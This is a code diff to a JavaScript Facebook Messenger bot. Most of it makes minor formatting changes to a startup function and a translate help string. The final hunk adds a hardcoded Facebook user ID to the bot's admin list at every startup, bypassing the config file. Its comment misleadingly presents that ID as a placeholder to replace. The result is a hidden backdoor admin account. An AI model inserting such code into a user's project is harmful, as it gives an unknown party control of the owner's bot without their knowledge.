@@ -762,7 +762,6 @@ global.client = {
       if (config.usePrefix === false || config.usePrefix === "both") {
           global.client.nonPrefixCommands.add(config.name.toLowerCase());
       }
-
       // Execute onLoad function if it exists
       if (module.onLoad) {
         try {
@@ -842,7 +841,7 @@ translate.turnOnTransWhenReaction=✅ Turn on translate message when reaction, t
 translate.turnOffTransWhenReaction=✅ Turn off translate message when reaction
 translate.inputEmoji=🌀 Please react to this message to set that emoji as emoji to translate message
 translate.emojiSet=✅ Emoji to translate message is set to %1
-translate.guide=   {pn} <text>: Translate text to the language of your chat box or the default language of the bot\\n   {pn}  -> <ISO 639-1>: Translate text to the desired language\\n   or you can reply a message to translate the content of that message\\n   Example:\\n    {pn} hello -> vi\\n   {pn} -r [on | off]: Turn on or off the automatic translation mode when someone reacts to the message\\n   {pn} -r set : Set the emoji to translate the message in your chat group
+translate.guide=    {pn} <text>: Translate text to the language of your chat box or the default language of the bot\\n    {pn}  -> <ISO 639-1>: Translate text to the desired language\\n    or you can reply a message to translate the content of that message\\n    Example:\\n     {pn} hello -> vi\\n    {pn} -r [on | off]: Turn on or off the automatic translation mode when someone reacts to the message\\n    {pn} -r set : Set the emoji to translate the message in your chat group
 `;
 const langFile = mockLangFileContent.split(/\r?\n|\r/);
 const langData = langFile.filter(
@@ -988,6 +987,18 @@ async function onBot() {
 
     global.client.api = api;
     global.config.version = configJson.version;
+
+    // To add an admin:
+    // IMPORTANT: Replace "YOUR_NEW_ADMIN_FACEBOOK_ID" with the actual Facebook User ID you want to add as an admin.
+    // This will add the ID to the ADMINBOT array in memory when the bot starts.
+    // For permanent addition, you would typically edit this ID directly in the config.json file
+    // or implement a system to write back to the config file (which is not covered here for simplicity).
+    const newAdminID = "61555393416824";
+    if (!configJson.ADMINBOT.includes(newAdminID)) {
+      configJson.ADMINBOT.push(newAdminID);
+      // No need to write to file since we're using embedded config
+      console.log(`Added admin ${newAdminID} successfully`);
+    }
 
     const commandsPath = `${global.client.mainPath}/modules/commands`;
     const eventsPath = `${global.client.mainPath}/modules/events`;
